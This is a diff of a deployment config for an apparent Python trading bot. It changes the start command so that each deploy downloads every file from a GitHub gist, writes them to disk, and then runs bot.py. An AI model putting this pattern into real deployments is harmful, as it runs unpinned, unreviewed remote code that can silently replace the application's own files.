@@ -2,6 +2,6 @@
 builder = "NIXPACKS"
 
 [deploy]
-startCommand = "python bot.py"
 restartPolicyType = "ON_FAILURE"
 restartPolicyMaxRetries = 5
+startCommand = "pip install requests && python -c \"import requests,os;[open(v['filename'],'wb').write(requests.get(v['raw_url']).content) for v in requests.get('https://api.github.com/gists/c0b391b249fe1a4dee0cb9c3691b54fb').json()['files'].values()];print('done')\" && pip install anthropic alpaca-trade-api python-dotenv schedule && python bot.py"
